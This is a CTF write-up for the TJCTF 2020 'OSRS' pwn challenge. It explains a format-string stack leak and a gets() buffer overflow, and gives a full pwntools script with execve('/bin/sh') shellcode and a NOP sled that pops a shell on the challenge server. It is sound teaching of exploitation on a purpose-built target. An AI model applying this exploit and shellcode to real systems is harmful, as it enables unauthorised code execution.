---
layout: post
title: TJCTF 2020 - OSRS
excerpt: "Writeup for shellcode buffer overflow challenge from TJCTF 2020"
categories: [pwn]
---

OSRS was a pwn challenge from TJCTF 2020 which supplied only a binary. The results of running the binary are seen below.

```
michael@computer:~/Documents/CTF/osrs$ ./osrs 
Enter a tree type: 
test
I don't have the tree -1222996 :(
```

Okay, when we give a value for "tree", the binary stops and gives back a seemingly random integer. The next step for me was analyzing the binary in [Ghidra](https://ghidra-sre.org/). I also ran checksec on the binary to see which security features needed to be bypassed. Below is the Ghidra's disassembled version of the `get_tree` function, which is called by main.

<img src="/img/pictures/ghidra-get-tree-osrs.png" >

```
michael@computer:~/Documents/CTF/osrs$ checksec ./osrs
[*] '/home/michael/Documents/CTF/osrs/osrs'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Wow! The binary has no security features enabled. Also, we can see the dangerous "gets" function being called with the 256 byte buffer called `tree_type`. Exploiting this would still be difficult though without knowing any addresses on the stack (for jumping to shellcode). Since ASLR is probably enabled, some brute forcing or more advanced technique would be necessary. Fortunately, the seemingly random number that we saw printed earlier is actually the `tree_type` variable being printed with the incorrect format string. Whenever a char pointer is passed into the format specifier of a signed integer, the address of the char is printed in signed integer format. This will give us an address on the stack to base our exploit off of. 

First, we need to store the leaked memory address, but also keep the program running. For this I used the buffer overflow to cause the program to return to the vulnerable `get_tree` function. On the second round through `get_tree`, we can put shellcode (with a [nop-slide](https://en.wikipedia.org/wiki/NOP_slide)) onto the stack and jump into it (taking advantage of our leaked stack address). Using GDB, I was able to determine that the offset from `tree_type` to the return pointer is 272. I also used python's "ctypes" module to convert the signed int to an unsigned int. My code is below.

```python
from pwn import *
import ctypes

p = remote('p1.tjctf.org', 8006)
#p = process('./osrs')

# http://shell-storm.org/shellcode/files/shellcode-827.php
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

get_tree = 0x080485c8

# return to get_tree
p.sendline('A' * 272 + p32(get_tree))

# read leak
leak = int(p.recvuntil(':(').split(' ')[-2])
leak = ctypes.c_uint(leak).value

# address of stack + ~30
stack = leak + 300

# return to nop sled + shellcode
p.sendline('A' * 272 + p32(stack) + '\x90' * 60 + shellcode) 

p.interactive()
```

Executing the script gives us a shell which allows us to read the flag (seen below). I hope this was helpful!

```
michael@computer:~/Documents/CTF/osrs$ python osrs.py 
[+] Opening connection to p1.tjctf.org on port 8006: Done
[*] Switching to interactive mode

Enter a tree type: 
I don't have the tree -9172 :(

$ cat flag.txt
tjctf{tr33_c0de_in_my_she115}
```
